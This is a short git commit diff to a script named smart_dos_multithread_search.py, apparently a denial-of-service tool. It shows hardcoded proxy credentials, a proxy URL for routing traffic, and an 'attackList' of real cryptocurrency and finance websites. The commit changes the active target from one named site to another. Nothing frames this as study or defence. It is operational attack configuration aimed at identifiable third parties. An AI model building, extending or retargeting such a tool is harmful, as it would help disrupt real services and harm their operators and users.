36151234d37b3dfa68ff7552cb7539f76990c362
blabla <heyholetsgo4@protonmail.com>
2023-01-23 23:53:42 +0200

    'a'

--- smart_dos_multithread_search.py
+++ smart_dos_multithread_search.py
@@ -16,9 +16,9 @@ PROXY_PASS = '123123123'
 PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@all.dc.smartproxy.com:PORT'
 
 attackList = [
-'https://coinspot.nl/fr',
+# 'https://coinspot.nl/fr',
 # 'https://cryptonaute.fr',
-# 'https://www.finaria.it',
+'https://www.finaria.it',
 # 'https://tradingplatforms.com'
 ]
 
